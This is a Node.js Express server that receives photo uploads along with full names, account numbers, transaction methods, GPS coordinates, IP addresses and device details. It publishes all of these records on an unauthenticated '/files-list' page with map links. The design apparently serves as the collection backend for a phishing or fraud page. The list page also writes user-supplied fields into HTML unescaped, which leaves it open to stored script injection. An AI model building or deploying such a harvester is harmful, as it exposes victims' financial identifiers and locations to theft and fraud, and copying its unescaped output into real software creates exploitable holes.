"use strict";

const express = require("express");
const path    = require("path");
const fs      = require("fs");
const multer  = require("multer");

const app  = express();
const PORT = process.env.PORT || 10000;

// ---------- Static assets ----------
const publicDir = path.join(__dirname, "public");
app.use(express.static(publicDir));

// parse form fields
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// ---------- Upload storage ----------
const uploadDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadDir),
  filename: (req, file, cb) => {
    const base = Date.now() + "-" + Math.random().toString(36).slice(2, 8);
    const ext  = path.extname(file.originalname || ".png") || ".png";
    cb(null, base + ext);
  }
});

const upload = multer({ storage });

// serve uploaded files
app.use("/files", express.static(uploadDir, { maxAge: "1h" }));

// ---------- Metadata helpers ----------
const META_PATH = path.join(uploadDir, "metadata.json");

function readMeta() {
  try {
    const raw = fs.readFileSync(META_PATH, "utf8");
    return JSON.parse(raw);
  } catch (e) {
    return [];
  }
}

function writeMeta(list) {
  fs.writeFileSync(META_PATH, JSON.stringify(list, null, 2));
}

// ---------- Routes ----------

// Home → redirect to recorder
app.get("/", (req, res) => {
  res.redirect("/recorder.html");
});

// Upload photo + form
app.post("/upload-photo", upload.single("photo"), (req, res) => {
  try {
    if (!req.file) {
      return res
        .status(400)
        .json({ ok: false, error: "No photo file received." });
    }

    const now = new Date();

    // Render puts client IP in x-forwarded-for
    const ipHeader = req.headers["x-forwarded-for"] || "";
    const ipAddress = ipHeader.split(",")[0].trim() || req.socket.remoteAddress || "";

    const metaEntry = {
      timestamp: now.toISOString(),
      ipAddress,
      fullName: req.body.fullName || "",
      accountNumber: req.body.accountNumber || "",
      method: req.body.transactionMethod || "",
      deviceInfo:
        req.body.deviceInfo || req.get("User-Agent") || "",
      clientLanguage: req.body.clientLanguage || req.get("Accept-Language") || "",
      clientTimezone: req.body.clientTimezone || "",
      screenSize: req.body.screenSize || "",
      gpsLat: req.body.gpsLat || "",
      gpsLng: req.body.gpsLng || "",
      gpsAccuracy: req.body.gpsAccuracy || "",
      fileName: req.file.filename
    };

    const list = readMeta();
    list.push(metaEntry);
    writeMeta(list);

    res.json({ ok: true, fileName: req.file.filename });
  } catch (err) {
    console.error("Upload error:", err);
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

// Simple HTML list of all uploads (with Google Maps link)
app.get("/files-list", (req, res) => {
  const list = readMeta();

  // newest first
  list.sort((a, b) => (a.timestamp < b.timestamp ? 1 : -1));

  const rows = list
    .map((item) => {
      const mapLink =
        item.gpsLat && item.gpsLng
          ? `<a href="https://www.google.com/maps?q=${encodeURIComponent(
              item.gpsLat + "," + item.gpsLng
            )}" target="_blank" rel="noopener noreferrer">View map</a>`
          : "";

      const fileLink = item.fileName
        ? `<a href="/files/${encodeURIComponent(item.fileName)}" target="_blank" rel="noopener noreferrer">${item.fileName}</a>`
        : "";

      return `
        <tr>
          <td>${item.timestamp || ""}</td>
          <td>${item.ipAddress || ""}</td>
          <td>${item.fullName || ""}</td>
          <td>${item.accountNumber || ""}</td>
          <td>${item.method || ""}</td>
          <td>${(item.deviceInfo || "").replace(/</g, "&lt;")}</td>
          <td>${mapLink}</td>
          <td>${fileLink}</td>
        </tr>`;
    })
    .join("");

  const html = `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Uploaded Photos</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      padding: 20px;
      background: #f4f6fb;
    }
    h1 { margin-top: 0; }
    table {
      width: 100%;
      border-collapse: collapse;
      background: #fff;
      box-shadow: 0 4px 14px rgba(15,23,42,0.12);
    }
    th, td {
      padding: 8px 10px;
      border: 1px solid #e5e7eb;
      font-size: 13px;
      vertical-align: top;
    }
    th {
      background: #111827;
      color: #f9fafb;
      text-align: left;
    }
    tr:nth-child(even) td { background: #f9fafb; }
    a { color: #2563eb; text-decoration: none; }
    a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <h1>Uploaded Photos</h1>
  <table>
    <thead>
      <tr>
        <th>Timestamp (UTC)</th>
        <th>IP Address</th>
        <th>Full Name</th>
        <th>Account #</th>
        <th>Method</th>
        <th>Device (User-Agent)</th>
        <th>Location</th>
        <th>File</th>
      </tr>
    </thead>
    <tbody>
      ${rows || ""}
    </tbody>
  </table>
</body>
</html>`;

  res.send(html);
});

// ---------- Start ----------
app.listen(PORT, () => {
  console.log("Server listening on", PORT);
});
